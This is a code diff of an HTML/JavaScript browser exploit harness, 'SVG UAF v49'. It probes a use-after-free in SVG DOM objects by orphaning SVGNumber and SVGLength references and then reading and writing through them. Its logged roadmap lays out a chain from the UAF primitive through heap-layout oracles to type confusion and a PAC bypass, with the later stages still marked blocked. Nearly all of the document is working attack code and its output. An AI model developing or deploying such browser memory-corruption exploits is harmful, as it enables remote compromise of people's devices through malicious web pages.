-    log('  INV1: near-singular (det≈-1e-7): a='+invNearSing.a.toExponential(3)+' b='+invNearSing.b.toExponential(3),'dim');
-  }
+  removeSVG(svg2);
 
-  R.inv1.hit=inv!==null;
-  R.inv1.detail='oracle_works='+(inv!==null)+' formula_exact='+(inv&&Math.abs(inv.a-(4/10))<0.01);
-  log('  INV1: '+R.inv1.detail,R.inv1.hit?'win':'dim');
+  // Sub-test C: FCM-based — remove entire filter (our main orphan technique)
+  L('  TOR1: [Sub-test C] FCM orphan — remove filter element from DOM');
+  var svg3=makeSVG();
+  var f=document.createElementNS(SVG_NS,'feColorMatrix');
+  f.setAttribute('type','matrix');
+  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt=document.createElementNS(SVG_NS,'filter');
+  filt.setAttribute('id','fC');
+  filt.appendChild(f);
+  svg3.appendChild(filt);
+  var blC=f.values.baseVal;
+  blC.clear();
+  var numC=makeSVGNum(55555);
+  blC.appendItem(numC);
+  var refC=blC.getItem(0);
+  try{L('  TOR1: [C-before-orphan] refC.value='+refC.value);}catch(ex){L('  TOR1: [C-before] THREW: '+ex.message);}
 
-  if(!q)dis(false);
+  // Remove filter from SVG (main orphan technique)
+  filt.parentNode.removeChild(filt);
+  try{var vC=refC.value;L('  TOR1: [C-after-filter-remove] refC.value='+vC+' → '+(vC===55555?'ALIVE':'CHANGED to '+vC));}
+  catch(ex){L('  TOR1: [C-after-filter-remove] THREW: '+ex.message);}
+
+  // Remove SVG too
+  removeSVG(svg3);
+  try{var vC2=refC.value;L('  TOR1: [C-after-svg-remove] refC.value='+vC2+' → '+(vC2===55555?'ALIVE':'CHANGED'));}
+  catch(ex){L('  TOR1: [C-after-svg-remove] THREW: '+ex.message);}
+
+  L('  TOR1: done');
 }
 
-async function runAll(){
-  dis(true);clearAll();
-  log('SVG UAF v48 — Layout Oracle + Cross-Type Adjacency + Computation Oracle','inf');sep();
-  await runLAY1(true);await raf();
-  await runLAY2(true);await raf();
-  await runXCT1(true);await raf();
-  await runADJ1(true);await raf();
-  await runINV1(true);await raf();
-  showStatus();dis(false);
+// ─────────────────────────────────────────────────────────────────
+// LEN1 — SVGLength Orphan Test
+// SVGAnimatedLength / SVGLength — different type, different UAF semantics?
+// ─────────────────────────────────────────────────────────────────
+function runLEN1(){
+  L('');L('LEN1: SVGLength Orphan Test');L('  Goal: orphan SVGLength objects, test write/read after DOM removal');
+
+  // ── Method A: SVGRect width/height (SVGAnimatedLength.baseVal → SVGLength)
+  L('  LEN1: [Method A] SVGRect.width.baseVal');
+  var svg=makeSVG();
+  var rect=document.createElementNS(SVG_NS,'rect');
+  rect.setAttribute('width','100');
+  rect.setAttribute('height','200');
+  rect.setAttribute('x','0');
+  rect.setAttribute('y','0');
+  svg.appendChild(rect);
+
+  var lenRef=rect.width.baseVal;  // SVGLength
+  try{L('  LEN1: [A-before] lenRef.value='+lenRef.value+' (wrote 100)');}catch(ex){L('  LEN1: [A-before] THREW:'+ex);}
+
+  // Orphan: remove rect from SVG
+  rect.parentNode.removeChild(rect);
+  try{var vA=lenRef.value;L('  LEN1: [A-after-rect-remove] lenRef.value='+vA+' → '+(vA===100?'ALIVE':'CHANGED to '+vA));}
+  catch(ex){L('  LEN1: [A-after-rect-remove] THREW: '+ex.message+' → DEAD');}
+
+  // Write after orphan
+  try{lenRef.value=44444;var vA2=lenRef.value;L('  LEN1: [A-write-after-orphan] wrote 44444, got='+vA2+' → '+(vA2===44444?'WRITABLE':'wrong'));}
+  catch(ex){L('  LEN1: [A-write-after-orphan] THREW: '+ex.message);}
+
+  // Remove SVG too
+  removeSVG(svg);
+  try{var vA3=lenRef.value;L('  LEN1: [A-after-svg-remove] lenRef.value='+vA3);}
+  catch(ex){L('  LEN1: [A-after-svg-remove] THREW: '+ex.message);}
+
+  // ── Method B: SVGPathElement.pathLength.baseVal
+  L('  LEN1: [Method B] SVGPathElement.pathLength.baseVal');
+  var svg2=makeSVG();
+  var path=document.createElementNS(SVG_NS,'path');
+  path.setAttribute('d','M 0 0 L 10 10');
+  path.setAttribute('pathLength','500');
+  svg2.appendChild(path);
+
+  var pathLen=path.pathLength;
+  var pathLenBase=null;
+  try{pathLenBase=pathLen.baseVal;L('  LEN1: [B-before] pathLen.baseVal.value='+pathLenBase.value);}
+  catch(ex){L('  LEN1: [B-before] no baseVal or THREW: '+ex.message);}
+
+  if(pathLenBase){
+    path.parentNode.removeChild(path);
+    try{var vB=pathLenBase.value;L('  LEN1: [B-after-remove] value='+vB+' → '+(vB===500?'ALIVE':'CHANGED to '+vB));}
+    catch(ex){L('  LEN1: [B-after-remove] THREW: '+ex.message);}
+    try{pathLenBase.value=12345;var vB2=pathLenBase.value;L('  LEN1: [B-write] wrote 12345 got='+vB2);}
+    catch(ex){L('  LEN1: [B-write] THREW: '+ex.message);}
+  }
+  removeSVG(svg2);
+
+  // ── Method C: SVGCircleElement.cx.baseVal (animated length)
+  L('  LEN1: [Method C] SVGCircleElement.cx.baseVal');
+  var svg3=makeSVG();
+  var circle=document.createElementNS(SVG_NS,'circle');
+  circle.setAttribute('cx','77');
+  circle.setAttribute('cy','88');
+  circle.setAttribute('r','10');
+  svg3.appendChild(circle);
+
+  var cxRef=circle.cx.baseVal;
+  try{L('  LEN1: [C-before] cx.baseVal.value='+cxRef.value);}catch(ex){L('  LEN1: [C-before] THREW:'+ex);}
+
+  // Remove circle (keep svg3)
+  circle.parentNode.removeChild(circle);
+  try{var vC=cxRef.value;L('  LEN1: [C-after-circle-remove] cxRef.value='+vC+' → '+(vC===77?'ALIVE':'CHANGED to '+vC));}
+  catch(ex){L('  LEN1: [C-after-circle-remove] THREW: '+ex.message);}
+
+  try{cxRef.value=11111;var vC2=cxRef.value;L('  LEN1: [C-write-after-remove] wrote 11111 got='+vC2+' → '+(vC2===11111?'WRITABLE':'wrong'));}
+  catch(ex){L('  LEN1: [C-write-after-remove] THREW: '+ex.message);}
+
+  // Remove SVG
+  removeSVG(svg3);
+  try{var vC3=cxRef.value;L('  LEN1: [C-after-svg-remove] cxRef.value='+vC3+' (wrote 11111)');}
+  catch(ex){L('  LEN1: [C-after-svg-remove] THREW: '+ex.message);}
+
+  // ── Method D: SVGNumberList from SVGFEColorMatrix — same as our main primitive
+  // but check SVGLength vs SVGNumber C++ type difference in survival semantics
+  L('  LEN1: [Method D] Compare: SVGNumber (our primitive) vs SVGLength survival timing');
+  var svg4=makeSVG();
+  var g4=document.createElementNS(SVG_NS,'g');
+  svg4.appendChild(g4);
+  // SVGLength from rect
+  var rect2=document.createElementNS(SVG_NS,'rect');
+  rect2.setAttribute('width','333');
+  svg4.appendChild(rect2);
+  var lenRef2=rect2.width.baseVal;
+  // SVGNumber from FCM
+  var f4=document.createElementNS(SVG_NS,'feColorMatrix');
+  f4.setAttribute('type','matrix');
+  f4.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt4=document.createElementNS(SVG_NS,'filter');
+  filt4.setAttribute('id','fD');
+  filt4.appendChild(f4);
+  svg4.appendChild(filt4);
+  var bl4=f4.values.baseVal;
+  bl4.clear();
+  var num4=makeSVGNum(444);
+  bl4.appendItem(num4);
+  var numRef4=bl4.getItem(0);
+
+  try{L('  LEN1: [D-before] lenRef2.value='+lenRef2.value+' numRef4.value='+numRef4.value);}catch(ex){L('  LEN1: [D-before] THREW:'+ex);}
+
+  // Orphan SVGLength: remove rect2
+  rect2.parentNode.removeChild(rect2);
+  // Orphan SVGNumber: remove filt4
+  filt4.parentNode.removeChild(filt4);
+
+  var lenAlive=false,numAlive=false;
+  try{var vL=lenRef2.value;lenAlive=true;L('  LEN1: [D-after-both-orphan] SVGLength='+vL+' ALIVE');}
+  catch(ex){L('  LEN1: [D-after-both-orphan] SVGLength DEAD: '+ex.message);}
+  try{var vN=numRef4.value;numAlive=true;L('  LEN1: [D-after-both-orphan] SVGNumber='+vN+' ALIVE');}
+  catch(ex){L('  LEN1: [D-after-both-orphan] SVGNumber DEAD: '+ex.message);}
+
+  // Remove SVG
+  removeSVG(svg4);
+  try{var vL2=lenRef2.value;L('  LEN1: [D-after-svg-remove] SVGLength='+vL2);}catch(ex){L('  LEN1: [D-after-svg-remove] SVGLength DEAD: '+ex.message);}
+  try{var vN2=numRef4.value;L('  LEN1: [D-after-svg-remove] SVGNumber='+vN2);}catch(ex){L('  LEN1: [D-after-svg-remove] SVGNumber DEAD: '+ex.message);}
+
+  L('  LEN1: SVGLength_alive='+lenAlive+' SVGNumber_alive='+numAlive);
 }
 
-function showStatus(){
-  SP.classList.add('on');SB.innerHTML='';
-  var stages=[
-    {id:'LAY1',name:'Controlled interleave adjacency',
-     result:R.lay1.hit?'★ ADJACENT WRITE CONFIRMED offset='+R.lay1.bleedOffset:'no bleed (expected — float only)',
-     hit:R.lay1.hit,detail:R.lay1.detail},
-    {id:'LAY2',name:'sizeof via write-through',
-     result:R.lay2.hit?'★ WRITE-THROUGH sizeof hint='+R.lay2.sizeof:'no write-through (sizeof large)',
-     hit:R.lay2.hit,detail:R.lay2.detail},
-    {id:'XCT1',name:'DOMMatrix fields + double-ref alias',
-     result:R.xct1.hit?'★ HIT: crossType='+R.xct1.crossType:'probed DOMMatrix fields',
-     hit:R.xct1.hit,detail:R.xct1.detail},
-    {id:'ADJ1',name:'Sequential FCM boundary write',
-     result:R.adj1.hit?'★ BOUNDARY WRITE-THROUGH sizeof='+R.adj1.sizeof:'no boundary bleed',
-     hit:R.adj1.hit,detail:R.adj1.detail},
-    {id:'INV1',name:'SVGMatrix inverse() oracle',
-     result:R.inv1.hit?'★ COMPUTATION ORACLE WORKS':'failed',
-     hit:R.inv1.hit,detail:R.inv1.detail},
-  ];
-  for(var i=0;i<stages.length;i++){
-    var s=stages[i];
-    var sr=document.createElement('div');sr.className='sr';
-    var dot=document.createElement('div');dot.className='sd '+(s.hit?'dg':'dgr');
-    var nm=document.createElement('div');nm.className='sn';nm.textContent=s.id+': '+s.name;
-    var sv=document.createElement('div');sv.className='sv '+(s.hit?'vg':'vgr');sv.textContent=s.result;
-    var dd=document.createElement('div');dd.className='sf';dd.textContent=s.detail;
-    sr.appendChild(dot);sr.appendChild(nm);
-    var ri=document.createElement('div');ri.style.flex='1';ri.appendChild(sv);ri.appendChild(dd);
-    sr.appendChild(ri);SB.appendChild(sr);
-  }
-  var chain=document.createElement('div');chain.className='sdiv';SB.appendChild(chain);
-  var chainTxt=document.createElement('div');chainTxt.className='sf';
-  chainTxt.innerHTML=
-    '<span class="hl">Stage 0 — UAF Primitive</span><br>'+
-    '✅ float32 write on SVGNumber/SVGMatrix/SVGPoint/FCM<br>'+
-    '✅ Full orphaned list control (append/replace/insert/clear/initialize)<br>'+
-    '✅ Cross-list insertion (same SVGNumber in two orphaned lists)<br><br>'+
-    '<span class="hl">Stage 1 — Heap Layout Oracle</span><br>'+
-    (R.lay1.hit?'✅':'🔴')+' LAY1: controlled interleave adjacency<br>'+
-    (R.lay2.hit?'✅':'🔴')+' LAY2: sizeof via write-through<br>'+
-    (R.adj1.hit?'✅':'🔴')+' ADJ1: FCM boundary write-through<br>'+
-    (R.xct1.crossType?'✅':'🔴')+' XCT1: double-ref alias (same obj, two handles)<br>'+
-    '🔴 IsoHeap bump-only — no freelist<br>'+
-    '🔴 fastMalloc zeroing — blocks ArrayBuffer groom<br><br>'+
-    '<span class="hl">Stage 2+ — Type Confusion → PAC</span><br>'+
-    '🔴 Blocked: need Stage 1 breakthrough<br>'+
-    (R.inv1.hit?'🟡 INV1: matrix computation oracle (potential addrof stepping stone)<br>':'');
-  SB.appendChild(chainTxt);
-}
+// ─────────────────────────────────────────────────────────────────
+// RUN ALL
+// ─────────────────────────────────────────────────────────────────
+L('SVG UAF v49 — Freelist + Storage + Refcount + SVGLength');
+L('----------------------------------------------------');
+
+var res_frl1=runFRL1();
+var res_sto1=runSTO1();
+runTOR1();
+runLEN1();
+
+// ── SUMMARY ──
+L('');
+L('FRL1: Freelist Reuse Detection');
+L((res_frl1.freelist_reuse?'★ TRUE UAF (freelist reuse)':'bump-only / Ref<> keeps alive'));
+L('freelist_reuse='+res_frl1.freelist_reuse);
+
+L('STO1: SVGMatrix Storage Precision');
+L((res_sto1.storage_f64?'★ FLOAT64 STORAGE':'float32 storage'));
+L('storage_f64='+res_sto1.storage_f64);
+
+L('');
+L('Stage 0 — UAF Primitive');
+L('✅ float32 write on SVGNumber/SVGMatrix/SVGPoint/FCM');
+L('✅ Full orphaned list control (append/replace/insert/clear/initialize)');
+L('✅ Cross-list insertion (same SVGNumber in two orphaned lists)');
+L('');
+L('Stage 1 — Heap Layout Oracle');
+L('🔴 LAY1: controlled interleave adjacency');
+L('🔴 LAY2: sizeof via write-through');
+L('🔴 ADJ1: FCM boundary write-through');
+L('✅ XCT1: double-ref alias (same obj, two handles)');
+L('🔴 IsoHeap bump-only — no freelist');
+L('🔴 fastMalloc zeroing — blocks ArrayBuffer groom');
+L('❓ FRL1: freelist_reuse='+res_frl1.freelist_reuse+' (THIS RUN)');
+L('❓ STO1: storage_f64='+res_sto1.storage_f64+' (THIS RUN)');
+L('');
+L('Stage 2+ — Type Confusion → PAC');
+L('🔴 Blocked: need Stage 1 breakthrough');
+L('🟡 INV1: matrix computation oracle (potential addrof stepping stone)');
 </script>
 </body>
 </html>
